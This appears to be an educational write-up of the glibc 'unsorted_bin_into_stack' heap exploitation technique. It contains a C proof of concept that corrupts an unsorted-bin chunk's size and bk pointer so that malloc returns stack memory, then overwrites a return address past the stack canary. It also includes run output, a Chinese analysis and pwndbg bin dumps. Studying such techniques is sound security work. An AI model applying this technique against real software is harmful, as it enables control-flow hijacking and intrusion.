# unsorted_bin_into_stack
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <assert.h>

void jackpot(){ printf("Nice jump d00d\n"); exit(0); }

int main() {
	intptr_t stack_buffer[4] = {0};

	printf("Allocating the victim chunk\n");
	intptr_t* victim = malloc(0x100);

	printf("Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\n");
	intptr_t* p1 = malloc(0x100);

	printf("Freeing the chunk %p, it will be inserted in the unsorted bin\n", victim);
	free(victim);

	printf("Create a fake chunk on the stack");
	printf("Set size for next allocation and the bk pointer to any writable address");
	stack_buffer[1] = 0x100 + 0x10;
	stack_buffer[3] = (intptr_t)stack_buffer;

	//------------VULNERABILITY-----------
	printf("Now emulating a vulnerability that can overwrite the victim->size and victim->bk pointer\n");
	printf("Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem\n");
	victim[-1] = 32;
	victim[1] = (intptr_t)stack_buffer; // victim->bk is pointing to stack
	//------------------------------------

	printf("Now next malloc will return the region of our fake chunk: %p\n", &stack_buffer[2]);
	char *p2 = malloc(0x100);
	printf("malloc(0x100): %p\n", p2);

	intptr_t sc = (intptr_t)jackpot; // Emulating our in-memory shellcode
	memcpy((p2+40), &sc, 8); // This bypasses stack-smash detection since it jumps over the canary

	assert((long)__builtin_return_address(0) == (long)jackpot);
}
```

**result**

```c
Allocating the victim chunk
Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
Freeing the chunk 0xd65420, it will be inserted in the unsorted bin
Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
Now next malloc will return the region of our fake chunk: 0x7ffd30ff2cd0
malloc(0x100): 0x7ffd30ff2cd0
Nice jump d00d
```

**analysis**

malloc(0x100)，再申请p1防止top chunk合并。然后在栈上伪造一个chunk，size=0x110，bk指向fake chunk。

之后，覆盖victim的size为0x20，因为我们要得到fake chunk而不是p，同时这是为了绕过大于2*SIZE_SZ (> 16 on x64) && < av->system_mem的检查，令其bk指针指向fake chunk。

再次malloc(0x100)，我们就能得到一个fake chunk。

**gdb**

free(victim)

```c
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x602410 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602410
smallbins
empty
largebins
empty
```

修改bk与size

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x411

Free chunk (unsortedbin)
Addr: 0x602410
Size: 0x20
fd: 0x7ffff7dd1b78
bk: 0x7fffffffdc60

Allocated chunk
Addr: 0x602430
Size: 0x00

pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x602410 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602410
BK: 0x602410 —▸ 0x7fffffffdc60 ◂— 0x7fffffffdc60
smallbins
empty
largebins
empty
```

malloc(0x100)

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x602410 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602410
BK: 0x7fffffffdc60 ◂— 0x7fffffffdc60
smallbins
0x20: 0x602410 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x602410
largebins
empty
```

